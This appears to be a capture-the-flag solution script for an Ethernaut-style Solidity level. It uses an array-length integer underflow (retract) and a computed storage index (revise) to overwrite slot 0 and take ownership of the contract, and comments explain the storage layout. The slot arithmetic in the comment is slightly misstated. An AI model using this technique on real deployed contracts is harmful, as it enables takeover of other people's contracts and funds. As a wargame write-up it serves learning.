const address_bytes = "0x000000000000000000000000203560aCa0Aa5AAc09d9708CE29b60Aa3E4366A8";
const location = "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a";

//Make_contact function should be called in order to pass the modifier.
contract.make_contact();

/*
Initially, the length of the dynamic array is zero. If length is reduced by one,
integer underflow occurs, and the length of the array becomes (2**256 - 1). This
helps us access the owner storage where it is stored at slot 0. 
*/

/*
Note how dynamic arrays are stored in Solidity smart contracts. At the slot where
dynamic arrays are stated as a storage variable, the length of the array is stored.
By taking keccak256 hash function of the slot number where length of array is stored, 
we can find the value corresponding to the slots. For example, slot keccak256(1) gives 
the starting array[0] value. The last slot is 2**256 - 1, corresponding to
array[2**256 - 1 - uint256(keccak256(1))] Then,array[2**256 - 1 - uint256(keccak256(1) + 1)] 
would give slot 0, aka our owner variable because there was an integer underflow. The uint above 
the highest uint is slot 0.

*/

contract.retract();

contract.revise(location, address_bytes);

